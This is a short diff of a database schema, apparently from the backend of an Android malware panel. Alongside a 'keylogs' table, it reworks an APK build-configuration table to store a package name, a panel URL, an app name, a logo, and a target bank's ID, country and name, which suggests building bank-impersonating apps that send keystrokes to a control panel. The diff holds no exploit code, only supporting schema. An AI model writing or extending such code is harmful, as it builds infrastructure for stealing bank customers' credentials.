@@ -17,8 +17,16 @@ export const keylogs = mysqlTable("keylogs", {
 
 export const apkRuntimeConfigs = mysqlTable("apkRuntimeConfigs", {
   id: serial("id").primaryKey(),
-  configKey: varchar("configKey", { length: 255 }).notNull(),
-  configValue: varchar("configValue", { length: 255 }),
+  packageName: varchar("packageName", { length: 255 }).notNull(),
+  panelUrl: varchar("panelUrl", { length: 255 }).notNull(),
+  appName: varchar("appName", { length: 80 }).notNull(),
+  logoUrl: varchar("logoUrl", { length: 255 }),
+  bankId: varchar("bankId", { length: 80 }),
+  bankCountry: varchar("bankCountry", { length: 80 }),
+  bankName: varchar("bankName", { length: 255 }),
+  artifactSource: varchar("artifactSource", { length: 20 }),
+  buildId: varchar("buildId", { length: 64 }).notNull(),
+  createdAt: varchar("createdAt", { length: 255 }),
   updatedAt: varchar("updatedAt", { length: 255 }),
 });
 
